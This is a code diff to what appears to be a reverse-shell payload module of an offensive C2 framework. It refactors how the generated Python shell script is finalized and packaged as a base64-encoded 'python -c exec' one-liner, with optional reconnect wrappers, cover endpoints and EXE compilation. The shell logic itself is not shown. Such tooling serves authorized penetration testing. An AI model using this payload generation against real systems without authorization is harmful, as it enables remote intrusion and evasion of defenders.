@@ -64,7 +64,8 @@ class Module(Payload):
 		xf_code = None
 		if obf and self._is_transform_compatible(obf) and hasattr(obf, "generate_client_code"):
 			xf_code = obf.generate_client_code(self._get_client_language())
-		return self._build_script(host, port, shell, xf_code)
+		script = self._build_script(host, port, shell, xf_code)
+		return self._finalize_python_script(script)
 
 	def generate(self):
 		host = str(self.lhost)
@@ -83,6 +84,7 @@ class Module(Payload):
 			print_warning(f"Transform does not support client language '{lang}' for this payload (supported: {supported}). Generating without stream transform.")
 
 		script = self._build_script(host, port, shell, xf_code)
+		script = self._finalize_python_script(script)
 
 		if bool(self.reconnect):
 			from lib.c2.tcp_resilience import build_python_reconnect_wrapper, parse_cover_endpoints
@@ -109,7 +111,5 @@ class Module(Payload):
 			print_warning("EXE compilation failed, falling back to Python command")
 
 		if xf_code or bool(self.use_pty):
-			import base64 as b64
-			encoded = b64.b64encode(script.encode("utf-8")).decode("ascii")
-			return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
-		return f"{py} -c \"{script}\""
+			return self._encode_python_one_liner(script, py)
+		return self._encode_python_one_liner(script, py, force_base64=False)
